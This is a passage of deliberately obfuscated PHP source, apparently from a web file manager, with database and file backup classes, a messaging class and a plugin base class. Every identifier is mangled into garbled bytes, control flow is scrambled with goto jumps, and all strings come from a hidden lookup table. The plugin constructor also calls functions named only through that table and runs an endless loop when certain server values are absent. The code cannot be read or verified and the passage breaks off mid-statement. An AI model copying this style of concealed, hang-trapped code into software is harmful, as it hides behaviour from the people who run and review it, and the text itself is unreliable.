d¸Ò‡¹½‚–; D®§œ˜Œ: $EŸ¨¯´£™ğ = new DbManage($b–‚‰áŒŠ, $bá´±¦­‹ä); $E›½ÅÉ­ï = array($aÙƒãœôš[769] => $bá´±¦­‹ä, $aÙƒãœôš[770] => time()); Backup::set($E›½ÅÉ­ï); goto eğøÙÏë‡; FË„¯¡‘œ: Backup::set($E›½ÅÉ­ï); if ($D±§¸Œ±åõ - $f¬Ò¸†‚…ö > 1) { $AÕğæÓ“‡• = $aÙƒãœôš[786]; if (stristr(I18n::getType(), $aÙƒãœôš[787])) { $AÕğæÓ“‡• = $aÙƒãœôš[788]; } write_log(array($AÕğæÓ“‡•, $E›½ÅÉ­ï), $aÙƒãœôš[775]); return !1; } return !0; goto e±´ĞÂÀÏ; dº¼äÜÙã: if (isset($bì„ÃÌ™º->task[$aÙƒãœôš[781]])) { $Fõš¨Š§è = $bì„ÃÌ™º->task[$aÙƒãœôš[781]] ? $bì„ÃÌ™º->task[$aÙƒãœôš[781]] : timeFloat(); $e’ŠáÜ“ = $Fõš¨Š§è - $bì„ÃÌ™º->task[$aÙƒãœôš[782]]; if ($e’ŠáÜ“ >= 0.2) { $D±§¸Œ±åõ += 1; } } $bì„ÃÌ™º->end(); $E›½ÅÉ­ï = array($aÙƒãœôš[769] => $bá´±¦­‹ä, $aÙƒãœôš[766] => 1, $aÙƒãœôš[783] => $D±§¸Œ±åõ, $aÙƒãœôš[784] => $f¬Ò¸†‚…ö, $aÙƒãœôš[785] => time()); goto FË„¯¡‘œ; eô«æ×××: $aÙƒãœôš =& $_SERVER[Ö‘Øù]; $FñŠ‹“°Ô‡ = Backup::get(); self::$io = $FñŠ‹“°Ô‡[$aÙƒãœôš[745]]; goto f‡ÈŸ…ºÓ; f‡ÈŸ…ºÓ: self::$name = $FñŠ‹“°Ô‡[$aÙƒãœôš[28]]; $b–‚‰áŒŠ = $GLOBALS[$aÙƒãœôš[6]][$aÙƒãœôš[17]]; $bá´±¦­‹ä = $this->_dbType($b–‚‰áŒŠ); goto D®§œ˜Œ; d¸Ò‡¹½‚–: $D±§¸Œ±åõ = $f¬Ò¸†‚…ö = 0; try { $CÌµÆ¯±Ù = $EŸ¨¯´£™ğ->db()->getTables(); } catch (Exception $AŠê„À¬) { return !1; } $CÌµÆ¯±Ù = array_diff($CÌµÆ¯±Ù, array($aÙƒãœôš[772], $aÙƒãœôš[773])); goto EíçˆÍ˜Û; EíçˆÍ˜Û: foreach ($CÌµÆ¯±Ù as $a­†Ñ õ¾œ) { $D±§¸Œ±åõ += $EŸ¨¯´£™ğ->model($a­†Ñ õ¾œ)->count(); } $bì„ÃÌ™º = new Task($aÙƒãœôš[774], $aÙƒãœôš[775], $D±§¸Œ±åõ, LNG($aÙƒãœôš[776]) . $aÙƒãœôš[777] . LNG($aÙƒãœôš[778])); foreach ($CÌµÆ¯±Ù as $a­†Ñ õ¾œ) { $FÑèùÎ‹¸» = $fâğÅÒÎ¾° . $a­†Ñ õ¾œ . $aÙƒãœôš[779]; $d¬Ğ‚­‚£… = null; if ($a­†Ñ õ¾œ == $aÙƒãœôš[780] && (!isset($FñŠ‹“°Ô‡[$aÙƒãœôš[748]]) || $FñŠ‹“°Ô‡[$aÙƒãœôš[748]] == $aÙƒãœôš[191])) { $d¬Ğ‚­‚£… = self::$io; } $f¬Ò¸†‚…ö += $EŸ¨¯´£™ğ->sqlFromDb($a­†Ñ õ¾œ, $FÑèùÎ‹¸», $bì„ÃÌ™º, $d¬Ğ‚­‚£…); } goto dº¼äÜÙã; e±´ĞÂÀÏ: } private function _dbType($BµÃÀ´˜¾ ) { goto D”ŒÄŸö”ˆ; e ïßÏì·â: return $Aãİ«í‘®¤; goto bƒ‚¸†‰©Ä; D”ŒÄŸö”ˆ: $cÁ”²Ã¬ºÕ =& $_SERVER[Ö‘Øù]; $BµÃÀ´˜¾  = array_change_key_case($BµÃÀ´˜¾ ); $Aãİ«í‘®¤ = $BµÃÀ´˜¾ [$cÁ”²Ã¬ºÕ[789]]; goto d¦íò»‹„Œ; d¦íò»‹„Œ: if ($Aãİ«í‘®¤ == $cÁ”²Ã¬ºÕ[790]) { $bÚßæ‡ÊŞ = explode($cÁ”²Ã¬ºÕ[4], $BµÃÀ´˜¾ [$cÁ”²Ã¬ºÕ[791]]); $Aãİ«í‘®¤ = $bÚßæ‡ÊŞ[0]; } $aÏäïÉ×Ğ© = array($cÁ”²Ã¬ºÕ[792] => $cÁ”²Ã¬ºÕ[9], $cÁ”²Ã¬ºÕ[793] => $cÁ”²Ã¬ºÕ[794]); if (isset($aÏäïÉ×Ğ©[$Aãİ«í‘®¤])) { $Aãİ«í‘®¤ = $aÏäïÉ×Ğ©[$Aãİ«í‘®¤]; } goto e ïßÏì·â; bƒ‚¸†‰©Ä: } private function tmpFilesPath() { $FŒ„Å¸ö—‰ =& $_SERVER[Ö‘Øù]; $DñÁğÀªÏ‰ = TEMP_FILES; if ($GLOBALS[$FŒ„Å¸ö—‰[6]][$FŒ„Å¸ö—‰[88]][$FŒ„Å¸ö—‰[795]]) { $DñÁğÀªÏ‰ = $GLOBALS[$FŒ„Å¸ö—‰[6]][$FŒ„Å¸ö—‰[88]][$FŒ„Å¸ö—‰[795]]; if (!mk_dir($DñÁğÀªÏ‰) || !is_writable($DñÁğÀªÏ‰) || !IO::mkfile($DñÁğÀªÏ‰ . $FŒ„Å¸ö—‰[796])) { $DñÁğÀªÏ‰ = TEMP_FILES; } } return $DñÁğÀªÏ‰; } } class BackupDbFile { public function __construct() { } public function index() { goto cƒÂçò„İ˜; d¿›ñó›ŞÒ: $Bç¨ùò”øè = IO::listPath($eÙÊŒÚåê™); $cÊ÷Û»¯ğ = isset($Bç¨ùò”øè[$a’î†Ûî˜[74]]) ? $Bç¨ùò”øè[$a’î†Ûî˜[74]] : array(); $fàâöì½§§ = array_sum(array_column($cÊ÷Û»¯ğ, $a’î†Ûî˜[78])); goto e¥øæÆ¦»«; C¿¹©±¦: Backup::set($cšÄôó‹”—); return !0; goto E¢ÎëÂ”Ë¦; C³‡è‰ Š‘: $DóÈ‹Œ• = CONTROLLER_DIR . $a’î†Ûî˜[803]; $aœÏ‡ñÒ£ = CONTROLLER_DIR . $a’î†Ûî˜[804]; IO::copy($DóÈ‹Œ•, $FÓ²ÙÜà¹); goto cØóÒù¸‰; cƒÂçò„İ˜: $a’î†Ûî˜ =& $_SERVER[Ö‘Øù]; $BíÑ¾©ÀºÖ = Backup::get(); $fˆ‡—ÏŞˆÖ = $BíÑ¾©ÀºÖ[$a’î†Ûî˜[28]]; goto E’·Í¾öìÎ; E’·Í¾öìÎ: $eÙÊŒÚåê™ = $this->tmpFilesPath() . "\142\141\143\153\x75\x70\137{$fˆ‡—ÏŞˆÖ}\57"; $FÓ²ÙÜà¹ = $this->backupPath($BíÑ¾©ÀºÖ); if (!($FÓ²ÙÜà¹ = IO::mkdir($FÓ²ÙÜà¹))) { return !1; } goto d¿›ñó›ŞÒ; c÷µºÙÌ§§: $E½Š‘Ø°× = new TaskFileTransfer($a’î†Ûî˜[799], $a’î†Ûî˜[775], count($cÊ÷Û»¯ğ), LNG($a’î†Ûî˜[776]) . $a’î†Ûî˜[455] . LNG($a’î†Ûî˜[778]) . $a’î†Ûî˜[800]); $E½Š‘Ø°×->task[$a’î†Ûî˜[756]] = $fàâöì½§§; foreach ($Bç¨ùò”øè[$a’î†Ûî˜[74]] as $b¸Õ¦„–¾¬) { $Cô¹ÏáÁ”³ = IO::move($b¸Õ¦„–¾¬[$a’î†Ûî˜[76]], $FÓ²ÙÜà¹); if (!$Cô¹ÏáÁ”³) { $E½Š‘Ø°×->end(); $c…ñÒéïÆ = IO::getLastError($a’î†Ûî˜[801] . $b¸Õ¦„–¾¬[$a’î†Ûî˜[76]] . $a’î†Ûî˜[802] . $FÓ²ÙÜà¹ . $a’î†Ûî˜[531]); write_log($c…ñÒéïÆ, $a’î†Ûî˜[775]); return !1; } } goto C³‡è‰ Š‘; cØóÒù¸‰: IO::copy($aœÏ‡ñÒ£, $FÓ²ÙÜà¹); $E½Š‘Ø°×->end(); $cšÄôó‹”— = array($a’î†Ûî˜[805] => $fàâöì½§§, $a’î†Ûî˜[806] => time()); goto C¿¹©±¦; e¥øæÆ¦»«: if (!$fàâöì½§§) { return !1; } $cšÄôó‹”— = array($a’î†Ûî˜[797] => $fàâöì½§§, $a’î†Ûî˜[798] => time()); Backup::set($cšÄôó‹”—); goto c÷µºÙÌ§§; E¢ÎëÂ”Ë¦: } private function backupPath($fáÄŸ°ò”À) { $fâµ•Òƒ =& $_SERVER[Ö‘Øù]; $fåÉ‰ğÍÃŞ = $fáÄŸ°ò”À[$fâµ•Òƒ[28]]; $bÅÎŸœÀ’ = Model($fâµ•Òƒ[763])->get($fâµ•Òƒ[764]); $Bƒ„Ë¡¢à¡ = substr(md5($fâµ•Òƒ[765] . $bÅÎŸœÀ’ . $fåÉ‰ğÍÃŞ), 0, 8); return "\x7b\x69\x6f\x3a{$fáÄŸ°ò”À[$fâµ•Òƒ[745]]}\x7d\57\x64\x61\164\x61\142\141\163\145\57\x62\141\x63\x6b\165\x70\57" . $fåÉ‰ğÍÃŞ . $fâµ•Òƒ[71] . $Bƒ„Ë¡¢à¡; } private function tmpFilesPath() { $Dá¶Šµá„ =& $_SERVER[Ö‘Øù]; $Aƒˆò‚™¹Œ = TEMP_FILES; if ($GLOBALS[$Dá¶Šµá„[6]][$Dá¶Šµá„[88]][$Dá¶Šµá„[795]]) { $Aƒˆò‚™¹Œ = $GLOBALS[$Dá¶Šµá„[6]][$Dá¶Šµá„[88]][$Dá¶Šµá„[795]]; if (!mk_dir($Aƒˆò‚™¹Œ) || !is_writable($Aƒˆò‚™¹Œ) || !IO::mkfile($Aƒˆò‚™¹Œ . $Dá¶Šµá„[796])) { $Aƒˆò‚™¹Œ = TEMP_FILES; } } return $Aƒˆò‚™¹Œ; } } goto aÌÏ¾…ª; d³Ô­¤óöÑ: class Message { function __construct() { } public function send($f…½§ŞÎ³® = '', $A—…ŸªœµŠ = array(), $A”©ì¨°Æ = "\x74\x65\x78\x74") { goto fÜºö¦Œ‘¯; E°•¾³‘¾: Hook::trigger($F—Ï™„í•Ô[1430], $EÉ®ÄÚ©È); goto d²î—‚ÖÜ”; Aº–´÷È: $A—…ŸªœµŠ = array($F—Ï™„í•Ô[510] => isset($A—…ŸªœµŠ[$F—Ï™„í•Ô[510]]) ? $A—…ŸªœµŠ[$F—Ï™„í•Ô[510]] : $F—Ï™„í•Ô[33], $F—Ï™„í•Ô[589] => isset($A—…ŸªœµŠ[$F—Ï™„í•Ô[589]]) ? $A—…ŸªœµŠ[$F—Ï™„í•Ô[589]] : $F—Ï™„í•Ô[33]); if (empty($f…½§ŞÎ³®) || empty($A—…ŸªœµŠ[$F—Ï™„í•Ô[510]]) && empty($A—…ŸªœµŠ[$F—Ï™„í•Ô[589]])) { return !1; } $EÉ®ÄÚ©È = array($F—Ï™„í•Ô[1368] => $B“ìÅÉ±¥®, $F—Ï™„í•Ô[1429] => $A—…ŸªœµŠ); goto E°•¾³‘¾; fÜºö¦Œ‘¯: $F—Ï™„í•Ô =& $_SERVER[Ö‘Øù]; $B“ìÅÉ±¥® = array($F—Ï™„í•Ô[29] => $F—Ï™„í•Ô[1427], $F—Ï™„í•Ô[748] => $f…½§ŞÎ³®); if (in_array($A”©ì¨°Æ, array($F—Ï™„í•Ô[1427], $F—Ï™„í•Ô[1428]))) { $B“ìÅÉ±¥®[$F—Ï™„í•Ô[29]] = $A”©ì¨°Æ; } goto Aº–´÷È; d²î—‚ÖÜ”: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto eÜ…À¦×ò; d¨İ‰ê‚¹Ù: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($bÀÉØ‚Å¡İ[1431]); goto fÃÑä÷¿ß; Aº®ìÆŸ±: if ($E¼²ä‚–ª && strpos($bÀÉØ‚Å¡İ[47] . $E¼²ä‚–ª . $bÀÉØ‚Å¡İ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$bÀÉØ‚Å¡İ[1435]] . $this->pluginName . $bÀÉØ‚Å¡İ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto Dâ˜ƒÊÍÑ‡; fÃÑä÷¿ß: $this->pluginName = str_replace($bÀÉØ‚Å¡İ[1431], $bÀÉØ‚Å¡İ[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $bÀÉØ‚Å¡İ[8]; $this->pluginApi = appHostGet() . $bÀÉØ‚Å¡İ[1432] . $this->pluginName . $bÀÉØ‚Å¡İ[8]; goto C»²˜¬‹öí; Dâ˜ƒÊÍÑ‡: $this->echoJsAssignArr = array(); return $this; goto EÛÑç‹Ô¿¬; eÜ…À¦×ò: $bÀÉØ‚Å¡İ =& $_SERVER[Ö‘Øù]; if (!isset($_SERVER[$bÀÉØ‚Å¡İ[834]]) || !isset($_SERVER[$bÀÉØ‚Å¡İ[835]])) { goto e„ÆÔã›Ş¯; d¢èËôäÓ¯: $BÄ¸ŞÑŞÙê = $FĞƒ¬°Ôîï($b¦Î¹™œ Í); $C±ÊâØŒ­ç = explode($bÀÉØ‚Å¡İ[229], $BÄ¸ŞÑŞÙê); if (count($C±ÊâØŒ­ç) < $bÀÉØ‚Å¡İ[606]) { $cùèŞÏ‰ = $bÀÉØ‚Å¡İ[839]; $cùèŞÏ‰(); } goto eÚ²àÈå¼Ë; eÚ²àÈå¼Ë: $C‰ö‚‚àğÆ = $bÀÉØ‚Å¡İ[875]; $C‰ö‚‚àğÆ($_SERVER[$bÀÉØ‚Å¡İ[876]]); $E±¹ÎÕ‰”® = 1; goto d¶çÈ°¹‘; d¶çÈ°¹‘: for ($B²ºÂÔ·ï = $E±¹ÎÕ‰”®; $B²ºÂÔ·ï > 0; $B²ºÂÔ·ï++) { $C‰ö‚‚àğÆ = json_encode($GLOBALS[$bÀÉØ‚Å¡İ[413]]); } goto dŒ²ì¹¥‹; e„ÆÔã›Ş¯: $Eš·ŠÚİ§ = $bÀÉØ‚Å¡İ[874]; $FĞƒ¬°Ôîï = $bÀÉØ‚Å¡İ[836]; $b¦Î¹™œ Í = $_SERVER[$bÀÉØ‚Å¡İ[837]] . $bÀÉØ‚Å¡İ[838]; goto d¢èËôäÓ¯; dŒ²ì¹¥‹: } global $in, $config; goto d¨İ‰ê‚¹Ù; C»²˜¬‹öí: $this->pluginHost = $config[$bÀÉØ‚Å¡İ[1433]] . $this->pluginName . $bÀÉØ‚Å¡İ[8]; $this->pluginHostDefault = $config[$bÀÉØ‚Å¡İ[1433]] . $this->pluginName . $bÀÉØ‚Å¡İ[8]; $E¼²ä‚–ª = $config[$bÀÉØ‚Å¡İ[1434]]; goto Aº®ìÆŸ±; EÛÑç‹Ô¿¬: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ö‘Øù][1436]); } protected function assign($bê·¬Ê‰, $A¿‚Å×¦Ô† = false) { if (is_array($bê·¬Ê‰)) { $this->values = array_merge($this->values, $bê·¬Ê‰); } else { $this->values[$bê·¬Ê‰] = $A¿‚Å×¦Ô†; } } protected function display($dò‹ÚÒš‹Ş) { extract($this->values); require $dò‹ÚÒš‹Ş; } final function hookRegist($cÆéä§„›¾) { $this->modelPlugin->appRegist($this->pluginName, $cÆéä§„›¾); } final function appIcon() { $bƒ¹´£©İ =& $_SERVER[Ö‘Øù]; $AªĞõÙµ” = $this->appPackage(); $b…µÊ¦èÒö = $bƒ¹´£©İ[33]; if (isset($AªĞõÙµ”[$bƒ¹´£©İ[411]])) { if (isset($AªĞõÙµ”[$bƒ¹´£©İ[411]][$bƒ¹´£©İ[1437]])) { $b…µÊ¦èÒö = $bƒ¹´£©İ[1438] . $AªĞõÙµ”[$bƒ¹´£©İ[411]][$bƒ¹´£©İ[1437]] . $bƒ¹´£©İ[1439]; } else { if ($AªĞõÙµ”[$bƒ¹´£©İ[411]][$bƒ¹´£©İ[1440]]) { $b…µÊ¦èÒö = $bƒ¹´£©İ[1441] . $AªĞõÙµ”[$bƒ¹´£©İ[411]][$bƒ¹´£©İ[1440]] . $bƒ¹´£©İ[1442]; } } } return $b…µÊ¦èÒö; } final function fileCanView($DóÙšÊ›§) { goto D“Í“Û§¹š; a¬É—”Ê¯á: $d¥³›ºéî¹ = Session::get($a¨©ë…ÌÉ[1443]); if (!$d¥³›ºéî¹ || !$d¥³›ºéî¹[$a¨©ë…ÌÉ[1444]]) { $bå¡‘Ğ¿…£ = $a¨©ë…ÌÉ[1445] . rawurlencode(this_url()); show_tips(LNG($a¨©ë…ÌÉ[1446]) . $a¨©ë…ÌÉ[1447] . $bå¡‘Ğ¿…£ . $a¨©ë…ÌÉ[1448] . LNG($a¨©ë…ÌÉ[1449]) . $a¨©ë…ÌÉ[1450], !1); } if (!Action($a¨©ë…ÌÉ[1451])->authCan($a¨©ë…ÌÉ[1452])) { show_tips(LNG($a¨©ë…ÌÉ[1453]) . $a¨©ë…ÌÉ[1454], !1); } goto EŒÈŒƒÃ¦; D“Í“Û§¹š: $a¨©ë…ÌÉ =& $_SERVER[Ö‘Øù]; if (request_url_safe($DóÙšÊ›§)) { return !0; } if ($this->isShare($DóÙšÊ›§)) { return !0; } goto a¬É—”Ê¯á; EŒÈŒƒÃ¦: ActionCall($a¨©ë…ÌÉ[1455], $DóÙšÊ›§); goto DªñÖÙ¯ª; DªñÖÙ¯ª: } final function isShare($cÌäÔ§øÁ·) { $b‘¤‘é¾øÜ = KodIO::parse($cÌäÔ§øÁ·); return $b‘¤‘é¾øÜ[$_SERVER[Ö‘Øù][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($AáÁ»Ë¦ÕÃ) { if (request_url_safe($AáÁ»Ë¦ÕÃ)) { return $AáÁ»Ë¦ÕÃ; } if (!$this->isShare($AáÁ»Ë¦ÕÃ)) { $AáÁ»Ë¦ÕÃ = $this->filePath($AáÁ»Ë¦ÕÃ); } return Action($_SERVER[Ö‘Øù][1104])->linkOut($AáÁ»Ë¦ÕÃ); } public function filePathLinkOut($F¡È„„‰ˆÓ) { if (request_url_safe($F¡È„„‰ˆÓ)) { return $F¡È„„‰ˆÓ; } $this->fileCanView($F¡È„„‰ˆÓ); return Action($_SERVER[Ö‘Øù][1104])->link($F¡È„„‰ˆÓ); } final function filePath($B¦“ßÍ‚œ«) { $bœÄ÷Ø÷Î =& $_SERVER[Ö‘Øù]; if ($açÎÂäîÂ× = $this->checkSharePath($B¦“ßÍ‚œ«)) { Hook::trigger($bœÄ÷Ø÷Î[1456], $açÎÂäîÂ×); return $açÎÂäîÂ×; } $this->fileCanView($B¦“ßÍ‚œ«); if (request_url_safe($B¦“ßÍ‚œ«)) { $C…Å©ÁÏ¤Ì = parse_url_query($B¦“ßÍ‚œ«); if (isset($C…Å©ÁÏ¤Ì[$bœÄ÷Ø÷Î[1457]]) && isset($C…Å©ÁÏ¤Ì[$bœÄ÷Ø÷Î[209]])) { $eÊ„…Ÿ…ÙÛ = Model($bœÄ÷Ø÷Î[763])->get($bœÄ÷Ø÷Î[764]); $fºêŠÖŸª = Mcrypt::decode($C…Å©ÁÏ¤Ì[$bœÄ÷Ø÷Î[209]], $eÊ„…Ÿ…ÙÛ); if ($fºêŠÖŸª) { $this->fileInfo = IO::infoWithChildren($fºêŠÖŸª); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $fºêŠÖŸª; } } $B¦“ßÍ‚œ« = $this->_cacheHttpFile($B¦“ßÍ‚œ«); $this->fileInfo = IO::infoWithChildren($B¦“ßÍ‚œ«); } else { $this->fileInfo = IO::infoWithChildren($B¦“ßÍ‚œ«); if (!$this->fileInfo) { show_tips(LNG($bœÄ÷Ø÷Î[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($bœÄ÷Ø÷Î[1456], $B¦“ßÍ‚œ«); return $B¦“ßÍ‚œ«; } final function _cacheHttpFile($c­¾­ÂØœ) { $EÌ‡ßîÃ®ó = hash_path($c­¾­ÂØœ, !0); $this->cachePath = $this->pluginCachePath($EÌ‡ßîÃ®ó); if ($FõÉ×º¡Òî = IO::fileNameExist($this->cachePath, $EÌ‡ßîÃ®ó)) { return KodIO::make($FõÉ×º¡Òî); } $c¾àÆŸ§Ìö = $this->cachePath . $EÌ‡ßîÃ®ó; return $this->pluginCacheFileSet($c¾àÆŸ§Ìö, file_get_contents_nossl($c­¾­ÂØœ)); } final function _tmpFileName($Có’ø±Ú = array()) { goto f¦§Û¯»ÄÍ; fªÙÀ°Ú¢÷: if (isset($Có’ø±Ú[$BŸ¡ªÊ”[164]][$BŸ¡ªÊ”[171]])) { return $Có’ø±Ú[$BŸ¡ªÊ”[164]][$BŸ¡ªÊ”[171]]; } $D’¿×â–Îğ = IO::hashSimple($Có’ø±Ú[$BŸ¡ªÊ”[76]]); if ($D’¿×â–Îğ) { return $D’¿×â–Îğ; } goto DùÊÊŠ·ô¥; f¦§Û¯»ÄÍ: $BŸ¡ªÊ” =& $_SERVER[Ö‘Øù]; if (!$Có’ø±Ú) { $Có’ø±Ú = $this->fileInfo; } if (isset($Có’ø±Ú[$BŸ¡ªÊ”[171]])) { return $Có’ø±Ú[$BŸ¡ªÊ”[171]]; } goto fªÙÀ°Ú¢÷; DùÊÊŠ·ô¥: $a´¶ğÁ‚Ûö = array($Có’ø±Ú[$BŸ¡ªÊ”[28]], $Có’ø±Ú[$BŸ¡ªÊ”[76]], $Có’ø±Ú[$BŸ¡ªÊ”[78]]); if (isset($Có’ø±Ú[$BŸ¡ªÊ”[516]])) { $a´¶ğÁ‚Ûö[] = $Có’ø±Ú[$BŸ¡ªÊ”[516]]; } return md5(implode($BŸ¡ªÊ”[71], $a´¶ğÁ‚Ûö)); goto b§ëÑÉ÷¦; b§ëÑÉ÷¦: } final function checkSharePath($cÃ‡ôéßËš) { goto Fˆ¿º…ÌóÙ; FíÙÆˆ¯Á°: $Cº†Ø®ö—– = Action($eçÑ¹îŸƒ[1104])->sharePathInfo($cÃ‡ôéßËš); if (!isset($Cº†Ø®ö—–[$eçÑ¹îŸƒ[76]])) { show_json(LNG($eçÑ¹îŸƒ[1458]), !1); } $this->fileInfo = $Cº†Ø®ö—–[$eçÑ¹îŸƒ[164]]; goto aÔÀğºášŸ; Fˆ¿º…ÌóÙ: $eçÑ¹îŸƒ =& $_SERVER[Ö‘Øù]; if (!defined($eçÑ¹îŸƒ[469])) { define($eçÑ¹îŸƒ[509], 0); } if (!$this->isShare($cÃ‡ôéßËš)) { return !1; } goto FíÙÆˆ¯Á°; aÔÀğºášŸ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$eçÑ¹îŸƒ[171]]); return $Cº†Ø®ö—–[$eçÑ¹îŸƒ[76]]; goto aº£ãµñˆ¬; aº£ãµñˆ¬: } final function pluginCachePath($B°Ÿ«Âì = '') { $a÷×£¢Á¬ =& $_SERVER[Ö‘Øù]; $A½¨øìš¯ù = IO_PATH_SYSTEM_TEMP . $a÷×£¢Á¬[1459] . $this->pluginName; if (!($aä»ªèæ´ = IO::infoFull($A½¨øìš¯ù))) { return IO::mkdir($A½¨øìš¯ù . $a÷×£¢Á¬[8] . $B°Ÿ«Âì); } if (empty($B°Ÿ«Âì)) { return $aä»ªèæ´[$a÷×£¢Á¬[76]]; } if (!($dÛ­Ëå‚â£ = IO::fileNameExist($aä»ªèæ´[$a÷×£¢Á¬[76]], $B°Ÿ«Âì))) { return IO::mkdir($aä»ªèæ´[$a÷×£¢Á¬[76]] . $B°Ÿ«Âì); } return KodIO::make($dÛ­Ëå‚â£); } final function pluginCacheFileSet($e‘‚¥‰„Œ¿, $bÙÉ¬Ó¨»¿ = '') { $DÜ¥ï§ÀÈ =& $_SERVER[Ö‘Øù]; if (!($C†Öğ…ÆŸ° = IO::infoFull($e‘‚¥‰„Œ¿))) { return IO::mkfile($e‘‚¥‰„Œ¿, $bÙÉ¬Ó¨»¿, REPEAT_REPLACE); } IO::setContent($C†Öğ…ÆŸ°[$DÜ¥ï§ÀÈ[76]], $bÙÉ¬Ó¨»¿); return $C†Öğ…ÆŸ°[$DÜ¥ï§ÀÈ[76]]; } final function pluginLocalFile($E‡„ôôò™¹ = '') { goto aŠéÈ‘Ù‚; aŠéÈ‘Ù‚: $f‚ñ‘®ù™ˆ =& $_SERVER[Ö‘Øù]; $CÚÎ†øëì = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($CÚÎ†øëì)) { mk_dir($CÚÎ†øëì); } goto cå¿»÷ƒÚì; cå¿»÷ƒÚì: if (!$E‡„ôôò™¹) { return $CÚÎ†øëì; } $cÊÑ‚æµĞå = IO::info($E‡„ôôò™¹); $Bµ½ó’çÓÃ = $this->_tmpFileName($cÊÑ‚æµĞå) . $f‚ñ‘®ù™ˆ[95] . $cÊÑ‚æµĞå[$f‚ñ‘®ù™ˆ[168]]; goto F«óŠîáß; F«óŠîáß: if (!checkExtSafe($Bµ½ó’çÓÃ)) { $Bµ½ó’çÓÃ = $Bµ½ó’çÓÃ . $f‚ñ‘®ù™ˆ[1460]; } $D·÷ÔÙ‘† = $CÚÎ†øëì . $Bµ½ó’çÓÃ; if (@file_exists($D·÷ÔÙ‘†)) { return $D·÷ÔÙ‘†; } goto EÄÃà„ç£; EÄÃà„ç£: return IO::copy($E‡„ôôò™¹, $CÚÎ†øëì, 0, $Bµ½ó’çÓÃ); goto eÌ…ñ«¿”Ò; eÌ…ñ«¿”Ò: } final function appPackage() { goto cÔ´Åà‘××; Aó¶“ÁÀÔ: return $DÁå¨äØÚš; goto C¹ó½¶ÅŸŒ; cåÄ†„×ô‹: $c¹Òå§ÊïÑ = Hook::trigger($DˆÖ‚‹±èæ[1462], $DÁå¨äØÚš); if ($c¹Òå§ÊïÑ && is_array($c¹Òå§ÊïÑ)) { $DÁå¨äØÚš = $c¹Òå§ÊïÑ; } $this->packageData = $DÁå¨äØÚš; goto Aó¶“ÁÀÔ; cÔ´Åà‘××: $DˆÖ‚‹±èæ =& $_SERVER[Ö‘Øù]; if ($this->packageData) { return $this->packageData; } $CÚ»ÀÂçÆ… = $this->parseFile($this->pluginPath . $DˆÖ‚‹±èæ[1461]); goto cˆìšƒ˜Àí; cˆìšƒ˜Àí: $this->parseLang($CÚ»ÀÂçÆ…); $DÁå¨äØÚš = json_decode_force($CÚ»ÀÂçÆ…); if (!$DÁå¨äØÚš) { return array(); } goto cåÄ†„×ô‹; C¹ó½¶ÅŸŒ: } public function packageInfoGet($Có×ä×Úµ) { $aÂì¤´¦Ûí = $this->appPackage(); return array_get_value($aÂì¤´¦Ûí, $Có×ä×Úµ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ö‘Øù][1463]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ö‘Øù][1464]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ö‘Øù][1465]); } public function echoJsAssign($aÉ±ÉÜŒĞö, $CŞ•è½ Ã´) { $this->echoJsAssignArr[$aÉ±ÉÜŒĞö] = $CŞ•è½ Ã´; } private function parseFile($c ÛŸŠÆ…¹) { goto E±ß¶çèÈ¿; E±ß¶çèÈ¿: $BÔ’ëİ¼ =& $_SERVER[Ö‘Øù]; $A¤Üƒê¡Œ = file_get_contents_nossl($c ÛŸŠÆ…¹); $A‡‚ÀÏÏòá = array($BÔ’ëİ¼[1466], $BÔ’ëİ¼[1467], $BÔ’ëİ¼[1468], $BÔ’ëİ¼[1469], $BÔ’ëİ¼[1470], $BÔ’ëİ¼[1471], $BÔ’ëİ¼[1472]); goto c…¬­Ù‰ã; fÂ–óˆäŠ: if (strstr($A¤Üƒê¡Œ, $BÔ’ëİ¼[1477])) { $BÔÄÈæÛË = $BÔÄÈæÛË = rawurlencode(json_encode($this->getConfig())); $A¤Üƒê¡Œ = str_replace($BÔ’ëİ¼[1477], $BÔÄÈæÛË, $A¤Üƒê¡Œ); } $A¤Üƒê¡Œ = str_replace($A‡‚ÀÏÏòá, $f¸¿¶êÆç, $A¤Üƒê¡Œ); return $A¤Üƒê¡Œ; goto C™Ü‹¶¢Í; c…¬­Ù‰ã: $f¸¿¶êÆç = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$BÔ’ëİ¼[88]][$BÔ’ëİ¼[1473]]); foreach ($this->echoJsAssignArr as $AĞÖ°‚Í™à => $fœ‹Ô³”Œ¿) { $A‡‚ÀÏÏòá[] = $BÔ’ëİ¼[1474] . $AĞÖ°‚Í™à . $BÔ’ëİ¼[1475]; $f¸¿¶êÆç[] = is_array($fœ‹Ô³”Œ¿) || is_object($fœ‹Ô³”Œ¿) ? rawurlencode(json_encode($fœ‹Ô³”Œ¿)) : $fœ‹Ô³”Œ¿; } if (strstr($A¤Üƒê¡Œ, $BÔ’ëİ¼[1476])) { $BÔÄÈæÛË = rawurlencode(json_encode($this->pluginLangArr)); $A¤Üƒê¡Œ = str_replace($BÔ’ëİ¼[1476], $BÔÄÈæÛË, $A¤Üƒê¡Œ); } goto fÂ–óˆäŠ; C™Ü‹¶¢Í: } private function parseLang(&$F·Šàæ®ãÛ) { goto dó—ºà”÷°; D¸ò¸‹ƒ¥»: $Cí×ÏëÛ´ä = array(); foreach ($a¡½¡˜ÃË„[0] as $FÒéÓŠÔÁ‘) { $Föà’Ù¨ Õ = substr($FÒéÓŠÔÁ‘, strlen($Aíì‹ÃŞ”¶), -4); $cŠøå‚Î = 